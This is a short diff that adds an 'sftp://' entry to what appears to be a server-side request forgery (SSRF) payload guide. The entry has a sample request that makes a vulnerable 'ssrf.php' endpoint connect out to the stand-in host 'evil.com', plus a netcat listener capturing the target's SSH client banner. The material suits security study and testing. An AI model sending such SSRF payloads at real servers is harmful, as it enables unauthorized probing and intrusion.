@@ -114,7 +114,16 @@
     Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 31126)
     CLIENT libcurl 7.40.0
   
-  
+ ## sftp:// -
+ 
+ Sftp stands for SSH File Transfer Protocol, or Secure File Transfer Protocol,
+ is a separate protocol packaged with SSH that works in a similar way over a secure connection.
+ 
+     http://example.com/ssrf.php?url=sftp://evil.com:1337/
+
+     evil.com:$ nc -lvp 1337
+     Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
+     SSH-2.0-libssh2_1.4.2
   
   
   
